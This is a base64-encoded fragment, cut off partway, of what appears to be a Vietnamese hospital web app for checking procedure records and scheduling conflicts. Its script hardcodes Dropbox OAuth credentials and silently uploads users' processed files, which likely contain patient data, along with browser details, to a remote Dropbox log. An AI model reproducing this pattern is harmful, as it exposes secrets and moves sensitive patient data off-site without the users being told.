aXR5KCkiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPkdp4budIHRy4buRbmc8L2J1dHRvbj4NCjxidXR0b24gY2xhc3M9ImJ0biIgaWQ9InBhdGllbnRMaXN0QnRuIiBvbmNsaWNrPSJvcGVuUGF0aWVudExpc3QoKSIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+RGFuaCBzw6FjaCBi4buHbmggbmjDom48L2J1dHRvbj4NCjxkaXYgaWQ9ImF2YWlsYWJpbGl0eVRhYmxlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgbWFyZ2luLWJvdHRvbTogMjBweDsiPg0KIDxkaXYgY2xhc3M9Im1haW5ibG9rIiBzdHlsZT0ibWFyZ2luLWJvdHRvbTogMTBweDsgZGlzcGxheTpub25lOyIgaWQ9ImF2YWlsYWJpbGl0eUZpbHRlckJsb2NrIj4NCiAgPGxhYmVsIGZvcj0iZmlsdGVyT3BlcmF0b3IiPk5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCiAgPHNlbGVjdCBpZD0iZmlsdGVyT3BlcmF0b3IiIGNsYXNzPSJsb2dpbi1pbnB1dCIgc3R5bGU9IndpZHRoOmF1dG87bWFyZ2luLXJpZ2h0OjIwcHg7Ij48L3NlbGVjdD4NCg0KICA8bGFiZWwgZm9yPSJmaWx0ZXJEYXRlIj5OZ8OgeTo8L2xhYmVsPg0KICA8c2VsZWN0IGlkPSJmaWx0ZXJEYXRlIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvOyI+PC9zZWxlY3Q+DQo8L2Rpdj4NCg0KICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIGhlcmItdGFibGUiPg0KICAgIDx0aGVhZD4NCiAgICAgIDx0cj4NCiAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICA8dGg+TmfDoHk8L3RoPg0KICAgICAgICANCiAgICAgICAgPHRoPktodW5nIGdp4budIHRy4buRbmcgYnXhu5VpIHPDoW5nPC90aD4NCiAgICAgICAgPHRoPktodW5nIGdp4budIHRy4buRbmcgYnXhu5VpIGNoaeG7gXU8L3RoPg0KICAgICAgPC90cj4NCiAgICA8L3RoZWFkPg0KICAgIDx0Ym9keSBpZD0iYXZhaWxhYmlsaXR5Qm9keSI+PC90Ym9keT4NCiAgPC90YWJsZT4NCjwvZGl2Pg0KPCEtLSBL4bq+VCBUSMOaQzogQuG6ok5HIEdJ4bucIFRS4buQTkcgVOG7qk5HIE5Hxq/hu5xJIC0tPg0KDQoNCg0KDQo8IS0tIE7DmlQgSEnhu4JOIFRI4buKIFRI4bumIFRIVeG6rFQgU+G6rkMgVEhV4buQQyAtLT4NCg0KDQogIA0KPCEtLSBC4bqiTkcgVEjhu6YgVEhV4bqsVCBT4bquQyBUSFXhu5BDIFRIQU5HIC0tPg0KPGRpdiBpZD0iaGVyYlByb2NlZHVyZVRhYmxlIiBzdHlsZT0iZGlzcGxheTogbm9uZTsgbWFyZ2luLXRvcDogMjBweDsiPg0KICA8ZGl2IGNsYXNzPSJtYWluYmxvayJzdHlsZT0ibWFyZ2luLWJvdHRvbTogMTBweDsiPg0KICAgIDxkaXY+DQogICAgPHNlbGVjdCBpZD0iaGVyYkRvY3RvckZpbHRlciIgY2xhc3M9ImxvZ2luLWlucHV0IiBzdHlsZT0id2lkdGg6YXV0bzsgbWFyZ2luLWxlZnQ6IDIwcHg7Ij4NCiAgICAgIDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6oyBiw6FjIHPEqTwvb3B0aW9uPg0KICAgIDwvc2VsZWN0Pg0KICAgIDxzZWxlY3QgaWQ9ImhlcmJEYXRlRmlsdGVyIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvOyI+PC9zZWxlY3Q+DQogIDwvZGl2PjwvZGl2Pg0KDQo8IS0tIFTDk00gVOG6rlQgT1VUTElFUiAtLT4NCjxkaXYgaWQ9ImhlcmJPdXRsaWVyU3VtbWFyeSIgc3R5bGU9ImRpc3BsYXk6bm9uZTttYXJnaW46OHB4IDIwcHg7Zm9udC1zaXplOjE0cHgiPg0KICA8IS0tIG7hu5lpIGR1bmcgc+G6vSDEkcaw4bujYyBKUyBj4bqtcCBuaOG6rXQgLS0+DQo8L2Rpdj4NCiAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgPHRoZWFkPg0KICAgICAgPHRyPg0KICAgICAgICA8dGg+SOG7jSB0w6puIGLhu4duaCBuaMOibjwvdGg+DQogICAgICAgIDx0aD5UaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgPHRoPk5nw6B5PC90aD4NCiAgICAgICAgPHRoPlRo4budaSBnaWFuPC90aD4NCiAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgPC90cj4NCiAgICA8L3RoZWFkPg0KICAgIDx0Ym9keSBpZD0iaGVyYlRhYmxlQm9keSI+PC90Ym9keT4NCiAgPC90YWJsZT4NCjwvZGl2Pg0KDQoNCjwhLS0gUE9QVVAgREFOSCBTw4FDSCBPVVRMSUVSIFPhuq5DIFRIVeG7kEMgVEhBTkcgLS0+DQo8ZGl2IGlkPSJoZXJiT3V0bGllck1vZGFsIiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO2luc2V0OjA7ei1pbmRleDoxMTAwMCI+DQogIDxkaXYgaWQ9ImhlcmJPdXRsaWVyQmFja2Ryb3AiIHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpIj48L2Rpdj4NCiAgPGRpdiByb2xlPSJkaWFsb2ciIGFyaWEtbW9kYWw9InRydWUiDQogICAgICAgY2xhc3M9Im1vZGFsLWJhc2UgbW9kYWwtbGFyZ2UiPg0KICAgIDxoMz5EYW5oIHPDoWNoIGNhIGtow6FjIMSRYSBz4buRPC9oMz4NCiAgICA8ZGl2IHN0eWxlPSJtYXJnaW46MTBweCAwO2ZvbnQtc2l6ZToxM3B4IiBpZD0iaGVyYk91dGxpZXJNb2RhbEluZm8iPjwvZGl2Pg0KICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiIHN0eWxlPSJtYXJnaW4tdG9wOjEwcHgiPg0KICAgICAgPHRoZWFkPg0KICAgICAgICA8dHI+DQogICAgICAgICAgPHRoPkjhu40gdMOqbiBi4buHbmggbmjDom48L3RoPg0KICAgICAgICAgIDx0aD5UaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICA8dGg+TmfDoHk8L3RoPg0KICAgICAgICAgIDx0aD5UaOG7nWkgZ2lhbjwvdGg+DQogICAgICAgICAgPHRoPk5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICA8L3RyPg0KICAgICAgPC90aGVhZD4NCiAgICAgIDx0Ym9keSBpZD0iaGVyYk91dGxpZXJNb2RhbEJvZHkiPjwvdGJvZHk+DQogICAgPC90YWJsZT4NCiAgICA8YnIvPg0KICAgIDxidXR0b24gY2xhc3M9ImJ0biIgdHlwZT0iYnV0dG9uIiBpZD0iaGVyYk91dGxpZXJDbG9zZUJ0biI+xJDDs25nPC9idXR0b24+DQogIDwvZGl2Pg0KPC9kaXY+DQoNCg0KDQoNCg0KDQo8YnIvPg0KPGJyLz4NCg0KDQo8ZGl2IGlkPSJlcnJvclNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQo8YnIvPg0KPGgzIGlkPSJlcnJvclNlY3Rpb25UaXRsZSI+TOG7l2kgTmjhuq1wIFNhaSBUaOG7nWkgR2lhbjwvaDM+DQo8ZGl2IGlkPSJvcGVyYXRvckZpbHRlckVycm9yIiBzdHlsZT0ibWFyZ2luLXRvcDogMTVweDsgZGlzcGxheTogbm9uZTsiPg0KPGxhYmVsIGZvcj0ib3BlcmF0b3JTZWxlY3RFcnJvciI+TOG7jWMgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvbGFiZWw+DQo8c2VsZWN0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9Im9wZXJhdG9yU2VsZWN0RXJyb3IiPg0KPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQo8L3NlbGVjdD4NCjwvZGl2Pg0KPGRpdiBpZD0iZXJyb3JMb2ciPjwvZGl2Pg0KPC9kaXY+DQo8YnIvPg0KDQo8ZGl2IGlkPSJyZXN1bHRTZWN0aW9uIiBzdHlsZT0iZGlzcGxheTogbm9uZTsiPg0KPGgzIGlkPSJyZXN1bHRTZWN0aW9uVGl0bGUiPlRyw7luZyBHaeG7nTwvaDM+IA0KDQo8ZGl2IGlkPSJvcGVyYXRvckZpbHRlciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCjxsYWJlbCBmb3I9Im9wZXJhdG9yU2VsZWN0Ij5M4buNYyB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCjxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0ib3BlcmF0b3JTZWxlY3QiPg0KPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQo8L3NlbGVjdD4NCjwvZGl2Pjxici8+DQoNCjx0YWJsZSBpZD0icmVzdWx0VGFibGUiPg0KPHRoZWFkPg0KPHRyPg0KPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQo8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCjx0aD48aSBjbGFzcz0iZmFyIGZhLWNhbGVuZGFyLWFsdCBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gTmfDoHk8L3RoPg0KPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIj48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oPC90aD4NCjx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IEfhu6NpIMO9IGdp4budPC90aD4NCjwvdHI+DQo8L3RoZWFkPg0KPHRib2R5IGlkPSJyZXN1bHRCb2R5Ij48L3Rib2R5Pg0KPC90YWJsZT4NCg0KDQo8L2Rpdj4NCjwhLS0gQuG6ok5HIEfhuq5OIFNBSSBNw4FZIC0tPg0KPGRpdiBpZD0ibWFjaGluZUVycm9yU2VjdGlvbiIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCiAgPGJyLz4NCiAgPGgzIGlkPSJtYWNoaW5lRXJyb3JTZWN0aW9uVGl0bGUiPkfhuq9uIFNhaSBNw6MgTcOheTwvaDM+DQogIDxkaXYgaWQ9Im1hY2hpbmVPcGVyYXRvckZpbHRlciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCiAgICA8bGFiZWwgZm9yPSJtYWNoaW5lT3BlcmF0b3JTZWxlY3QiPkzhu41jIHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KICAgIDxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0ibWFjaGluZU9wZXJhdG9yU2VsZWN0Ij4NCiAgICAgIDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6ozwvb3B0aW9uPg0KICAgIDwvc2VsZWN0Pg0KICA8L2Rpdj4NCiAgPGRpdiBpZD0ibWFjaGluZUVycm9yTG9nIj48L2Rpdj4NCjwvZGl2Pg0KPGJyLz4NCg0KPCEtLSBC4bqiTkcgWFVORyDEkOG7mFQgTcOBWSAtLT4NCjxkaXYgaWQ9Im1hY2hpbmVDb25mbGljdFNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogIDxici8+DQogIDxoMyBpZD0ibWFjaGluZUNvbmZsaWN0U2VjdGlvblRpdGxlIj5YdW5nIMSQ4buZdCBNw6F5PC9oMz4NCiAgPGRpdiBpZD0ibWFjaGluZUNvbmZsaWN0T3BlcmF0b3JGaWx0ZXIiIHN0eWxlPSJtYXJnaW4tdG9wOiAxNXB4OyBkaXNwbGF5OiBub25lOyI+DQogICAgPGxhYmVsIGZvcj0ibWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QiPkzhu41jIHRoZW8gbmfGsOG7nWkgdGjhu7FjIGhp4buHbjo8L2xhYmVsPg0KICAgIDxzZWxlY3QgY2xhc3M9ImxvZ2luLWlucHV0IiBpZD0ibWFjaGluZUNvbmZsaWN0T3BlcmF0b3JTZWxlY3QiPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQogICAgPC9zZWxlY3Q+DQogIDwvZGl2Pg0KICA8ZGl2IGlkPSJtYWNoaW5lQ29uZmxpY3RMb2ciPjwvZGl2Pg0KPC9kaXY+DQo8YnIvPg0KPCEtLSBC4bqiTkcgUVXDik4gR+G6rk4gTcODIE3DgVkgLS0+DQo8ZGl2IGlkPSJtaXNzaW5nTWFjaGluZVNlY3Rpb24iIHN0eWxlPSJkaXNwbGF5OiBub25lOyI+DQogIDxici8+DQogIDxoMyBpZD0ibWlzc2luZ01hY2hpbmVTZWN0aW9uVGl0bGUiPlF1w6puIEfhuq9uIE3DoyBNw6F5PC9oMz4NCiAgPGRpdiBpZD0ibWlzc2luZ01hY2hpbmVPcGVyYXRvckZpbHRlciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCiAgICA8bGFiZWwgZm9yPSJtaXNzaW5nTWFjaGluZU9wZXJhdG9yU2VsZWN0Ij5M4buNYyB0aGVvIG5nxrDhu51pIHRo4buxYyBoaeG7h246PC9sYWJlbD4NCiAgICA8c2VsZWN0IGNsYXNzPSJsb2dpbi1pbnB1dCIgaWQ9Im1pc3NpbmdNYWNoaW5lT3BlcmF0b3JTZWxlY3QiPg0KICAgICAgPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+DQogICAgPC9zZWxlY3Q+DQogIDwvZGl2Pg0KICA8ZGl2IGlkPSJtaXNzaW5nTWFjaGluZUxvZyI+PC9kaXY+DQo8L2Rpdj4NCjxici8+DQoNCjwhLS0gQuG6ok5HIFRI4bucSSBHSUFOIELhuq5UIMSQ4bqmVSBLSMOBQyBOR8OAWSBUSOG7sEMgSEnhu4ZOIC0tPg0KPGRpdiBpZD0iZGF0ZU1pc21hdGNoU2VjdGlvbiIgc3R5bGU9ImRpc3BsYXk6IG5vbmU7Ij4NCiAgPGJyLz4NCiAgPGgzIGlkPSJkYXRlTWlzbWF0Y2hTZWN0aW9uVGl0bGUiPlRo4budaSBHaWFuIFkgTOG7h25oIEtow6FjIFRo4budaSBHaWFuIFRo4buxYyBIaeG7h248L2gzPg0KICA8ZGl2IGlkPSJkYXRlTWlzbWF0Y2hPcGVyYXRvckZpbHRlciIgc3R5bGU9Im1hcmdpbi10b3A6IDE1cHg7IGRpc3BsYXk6IG5vbmU7Ij4NCiAgICA8bGFiZWwgZm9yPSJkYXRlTWlzbWF0Y2hPcGVyYXRvclNlbGVjdCI+TOG7jWMgdGhlbyBuZ8aw4budaSB0aOG7sWMgaGnhu4duOjwvbGFiZWw+DQogICAgPHNlbGVjdCBjbGFzcz0ibG9naW4taW5wdXQiIGlkPSJkYXRlTWlzbWF0Y2hPcGVyYXRvclNlbGVjdCI+DQogICAgICA8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4NCiAgICA8L3NlbGVjdD4NCiAgPC9kaXY+DQogIDxkaXYgaWQ9ImRhdGVNaXNtYXRjaExvZyI+PC9kaXY+DQo8L2Rpdj4NCjxici8+DQo8L2Rpdj4NCjwvZGl2Pg0KPHNjcmlwdD4NCi8vIFThuqNpIFhMU1ggY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVYTFNYKCkgew0KICBpZiAoIXdpbmRvdy5YTFNYKSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy94bHN4LzAuMTguNS94bHN4LmZ1bGwubWluLmpzJyk7DQogIH0NCn0NCg0KLy8gVOG6o2kgRHJvcGJveCBTREsgY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVEcm9wYm94KCkgew0KICBpZiAoIXdpbmRvdy5Ecm9wYm94KSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL3VucGtnLmNvbS9kcm9wYm94L2Rpc3QvRHJvcGJveC1zZGsubWluLmpzJyk7DQogIH0NCn0NCg0KDQogICAgICAgIC8vIERhbmggc8OhY2ggdGjhu6cgdGh14bqtdA0KICAgICAgIGxldCBQUk9DRURVUkVTID0ge307DQoNCmFzeW5jIGZ1bmN0aW9uIGxvYWRQcm9jZWR1cmVzKCkgew0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHJlcyA9IGF3YWl0IGZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vY2hhdV90aHV0aHVhdC50eHQnKTsNCiAgICAgICAgY29uc3QgdGV4dCA9IGF3YWl0IHJlcy50ZXh0KCk7DQogICAgICAgIFBST0NFRFVSRVMgPSBKU09OLnBhcnNlKHRleHQpOw0KICAgIH0gY2F0Y2ggKGVycikgew0KICAgICAgICBhbGVydCgnS2jDtG5nIHRo4buDIHThuqNpIGRhbmggc8OhY2ggdGjhu6cgdGh14bqtdDogJyArIGVyci5tZXNzYWdlKTsNCiAgICAgICAgY29uc29sZS5lcnJvcihlcnIpOw0KICAgIH0NCn0NCg0KCQkNCg0KICAgICAgICAvLyBCaeG6v24gdG/DoG4gY+G7pWMNCiAgICAgICAgbGV0IGVycm9yTG9nID0gW107DQogICAgICAgIGxldCBjdXJyZW50VXNlciA9IG51bGw7DQogICAgICAgIGxldCBhbGxQcm9jZWR1cmVzID0gW107DQogICAgICAgLy8gQmnhur9uIGNobyBraeG7g20gdHJhIG3DoXkNCiAgICAgICAgbGV0IG1hY2hpbmVFcnJvckxvZyA9IFtdOw0KICAgICAgICBsZXQgbWFjaGluZUNvbmZsaWN0TG9nID0gW107DQoJCWxldCBtaXNzaW5nTWFjaGluZUxvZyA9IFtdOw0KCQlsZXQgZGF0ZU1pc21hdGNoTG9nID0gW107DQogICAgICAgIC8vID09PSBL4bq+VCBUSMOaQyBDT0RFIE3hu5pJID09PQ0KDQoNCg0KDQoNCg0KDQoNCmNvbnN0IERST1BCT1hfQ09ORklHID0gew0KICAgIHJlZnJlc2hUb2tlbjogImN0Z0J2ajNJc3RjQUFBQUFBQUFBQVZGQ3NJWEl1el9DVFFwSW1ha2NDNGN1UVY4RHVta2ZnRFdJczhWR1B2RlQiLA0KICAgIGNsaWVudElkOiAidzhhd2oycXhvM2FpdjVlIiwNCiAgICBjbGllbnRTZWNyZXQ6ICJxa3FvMXU3YXRzN2JsOWciDQp9Ow0KDQphc3luYyBmdW5jdGlvbiBnZXRBY2Nlc3NUb2tlbigpIHsNCiAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKCJodHRwczovL2FwaS5kcm9wYm94YXBpLmNvbS9vYXV0aDIvdG9rZW4iLCB7DQogICAgICAgIG1ldGhvZDogIlBPU1QiLA0KICAgICAgICBoZWFkZXJzOiB7DQogICAgICAgICAgICAiQXV0aG9yaXphdGlvbiI6ICJCYXNpYyAiICsgYnRvYShgJHtEUk9QQk9YX0NPTkZJRy5jbGllbnRJZH06JHtEUk9QQk9YX0NPTkZJRy5jbGllbnRTZWNyZXR9YCksDQogICAgICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCINCiAgICAgICAgfSwNCiAgICAgICAgYm9keTogYGdyYW50X3R5cGU9cmVmcmVzaF90b2tlbiZyZWZyZXNoX3Rva2VuPSR7RFJPUEJPWF9DT05GSUcucmVmcmVzaFRva2VufWANCiAgICB9KTsNCiAgICBjb25zdCBkYXRhID0gYXdhaXQgcmVzcG9uc2UuanNvbigpOw0KICAgIHJldHVybiBkYXRhLmFjY2Vzc190b2tlbjsNCn0NCi8vIFThuqNpIFhMU1ggY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVYTFNYKCkgew0KICBpZiAoIXdpbmRvdy5YTFNYKSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy94bHN4LzAuMTguNS94bHN4LmZ1bGwubWluLmpzJyk7DQogIH0NCn0NCg0KLy8gVOG6o2kgRHJvcGJveCBTREsgY2jhu4kga2hpIGPhuqduDQphc3luYyBmdW5jdGlvbiBlbnN1cmVEcm9wYm94KCkgew0KICBpZiAoIXdpbmRvdy5Ecm9wYm94KSB7DQogICAgYXdhaXQgaW1wb3J0KCdodHRwczovL3VucGtnLmNvbS9kcm9wYm94L2Rpc3QvRHJvcGJveC1zZGsubWluLmpzJyk7DQogIH0NCn0NCmFzeW5jIGZ1bmN0aW9uIHVwbG9hZFRvRHJvcGJveChmaWxlLCBraG9hVmFsdWUsIG5nYXlWYWx1ZSwgc3RhdHMgPSB7IGhlcmI6IDAsIHRpbWU6IDAsIGNvbmZsaWN0OiAwIH0pIHsNCiBjb25zdCBjdXJyZW50VXNlciA9IHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ21lZFVzZXInKTsNCiAgaWYgKGN1cnJlbnRVc2VyICYmIGN1cnJlbnRVc2VyLnRvTG93ZXJDYXNlKCkgPT09ICdkb2N0b3InKSB7DQogICAgcmV0dXJuOyANCiAgfQ0KICBhd2FpdCBlbnN1cmVEcm9wYm94KCk7IC8vIMSR4bqjbSBi4bqjbyBjw7MgRHJvcGJveCBTREsNCiAgICBjb25zdCBhY2Nlc3NUb2tlbiA9IGF3YWl0IGdldEFjY2Vzc1Rva2VuKCk7DQogICAgY29uc3QgZGJ4ID0gbmV3IERyb3Bib3guRHJvcGJveCh7IGFjY2Vzc1Rva2VuIH0pOw0KDQogICAgY29uc3QgcGNOYW1lID0gbmF2aWdhdG9yLnVzZXJBZ2VudDsNCiAgICBjb25zdCBub3cgPSBuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCd2aS1WTicpOw0KICAgIGNvbnN0IGZpbGVuYW1lID0gYCR7ZmlsZS5uYW1lLnJlcGxhY2UoL1wuW14vLl0rJC8sICIiKX1fJHtEYXRlLm5vdygpfS54bHN4YDsNCg0KICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgZGJ4LmZpbGVzVXBsb2FkKHsNCiAgICAgICAgcGF0aDogYC90aHV0aHVhdC8ke2ZpbGVuYW1lfWAsDQogICAgICAgIGNvbnRlbnRzOiBmaWxlLA0KICAgICAgICBtb2RlOiAnYWRkJywNCiAgICAgICAgYXV0b3JlbmFtZTogdHJ1ZQ0KICAgIH0pOw0KDQogICAgLy8gR2hpIG1ldGFkYXRhIHbDoG8gZmlsZSBKU09OIHRydW5nIHTDom0gKGThuqFuZyB0ZXh0IGFwcGVuZCkNCiAgICBjb25zdCBtZXRhZGF0YSA9IHsNCiAgICAgICAgc3R0OiBEYXRlLm5vdygpLA0KICAgIGtob2E6IGtob2FWYWx1ZSwgICAgICAgIC8vIOKchSDEkcO6bmcgYmnhur9uDQogICAgbmdheTogbmdheVZhbHVlLCAgICAvLyDinIUgxJHDum5nIGJp4bq/bg0KICAgICAgICBsaW5rOiAiaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vaG9tZS90aHV0aHVhdD9wcmV2aWV3PSIgKyBlbmNvZGVVUklDb21wb25lbnQoZmlsZW5hbWUpLA0KICAgICAgICBwYzogcGNOYW1lLA0KICAgICAgICB0aW1lOiBub3csDQoJCWhlcmJfZXJyb3JzOiBOdW1iZXIoc3RhdHMuaGVyYikgfHwgMCwNCiAgICB0aW1lX2Vycm9yczogTnVtYmVyKHN0YXRzLnRpbWUpIHx8IDAsDQogICBjb25mbGljdF9lcnJvcnM6IE51bWJlcihzdGF0cy5jb25mbGljdCkgfHwgMA0KICAgIH07DQoNCiAgICBhd2FpdCBhcHBlbmREcm9wYm94TG9nKG1ldGFkYXRhKTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gYXBwZW5kRHJvcGJveExvZyhsb2dJdGVtKSB7DQogICAgY29uc3QgYWNjZXNzVG9rZW4gPSBhd2FpdCBnZXRBY2Nlc3NUb2tlbigpOw0KICAgIGNvbnN0IGRieCA9IG5ldyBEcm9wYm94LkRyb3Bib3goeyBhY2Nlc3NUb2tlbiB9KTsNCg0KICAgIGNvbnN0IGxvZ1BhdGggPSAnL3RodXRodWF0L2xvZy5qc29uJzsNCiAgICBsZXQgbG9ncyA9IFtdOw0KDQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBkYnguZmlsZXNEb3dubG9hZCh7IHBhdGg6IGxvZ1BhdGggfSk7DQogICAgICAgIGNvbnN0IGJsb2IgPSByZXNwb25zZS5yZXN1bHQuZmlsZUJsb2I7IC8vIOKchSBkw7luZyAucmVzdWx0LmZpbGVCbG9iDQogICAgICAgIGNvbnN0IHRleHQgPSBhd2FpdCBibG9iLnRleHQoKTsNCiAgICAgICAgbG9ncyA9IEpTT04ucGFyc2UodGV4dCk7DQogICAgfSBjYXRjaCAoZSkgew0KICAgICAgICBjb25zb2xlLndhcm4oIktow7RuZyB0w6xtIHRo4bqleSBsb2cuanNvbiBjxakgaG/hurdjIGzhu5dpIMSR4buNYzoiLCBlKTsNCiAgICAgICAgbG9ncyA9IFtdOw0KICAgIH0NCg0KICAgIC8vIENow6huIG3hu5tpIG5o4bqldCBsw6puIMSR4bqndQ0KICAgIGxvZ3MudW5zaGlmdChsb2dJdGVtKTsNCg0KICAgIGF3YWl0IGRieC5maWxlc1VwbG9hZCh7DQogICAgICAgIHBhdGg6IGxvZ1BhdGgsDQogICAgICAgIGNvbnRlbnRzOiBKU09OLnN0cmluZ2lmeShsb2dzLCBudWxsLCAyKSwNCiAgICAgICAgbW9kZTogeyAnLnRhZyc6ICdvdmVyd3JpdGUnIH0sIC8vIOKchSBHaGkgxJHDqCBi4bqvdCBideG7mWMNCiAgICAgICAgYXV0b3JlbmFtZTogZmFsc2UNCiAgICB9KTsNCn0NCg0KDQphc3luYyBmdW5jdGlvbiBpbml0QWZ0ZXJMb2dpbigpIHsNCiAgYXdhaXQgUHJvbWlzZS5hbGwoWw0KICAgIGxvYWRQcm9jZWR1cmVzKCksDQogICAgbG9hZENvbmZsaWN0UnVsZXMoKQ0KICBdKTsNCn0NCg0KDQoNCiAgICAgICAgLy8gPT09PT09PT09PSBQSOG6pk4gxJDEgk5HIE5I4bqsUCA9PT09PT09PT09IC8vDQphc3luYyBmdW5jdGlvbiBjaGVja1NhdmVkTG9naW4oKSB7DQogICAgY29uc3Qgc2F2ZWRVc2VyID0gc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpOw0KICAgIGlmIChzYXZlZFVzZXIpIHsNCiAgICAgICAgY3VycmVudFVzZXIgPSBzYXZlZFVzZXI7DQogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpblNlY3Rpb24nKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbkNvbnRlbnQnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgaW5pdEFmdGVyTG9naW4oKTsgLy8gYXV0by1sb2dpbiBt4bubaSBsb2FkIGThu68gbGnhu4d1DQogICAgfQ0KfQ0KDQpsZXQgaXNMb2dpbkFjdGlvbiA9IGZhbHNlOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KbGV0IGFuYWx5emVQb3B1cFRpbWVyOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KYXN5bmMgZnVuY3Rpb24gY2hlY2tMb2dpbigpIHsNCiAgY29uc3QgYnRuTG9naW4gICA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkJ0bicpOw0KICBjb25zdCB1c2VybmFtZSAgID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKS52YWx1ZS50cmltKCk7DQogIGNvbnN0IHBhc3N3b3JkICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGFzc3dvcmRJbnB1dCcpLnZhbHVlLnRyaW0oKTsNCiAgY29uc3QgbG9naW5Fc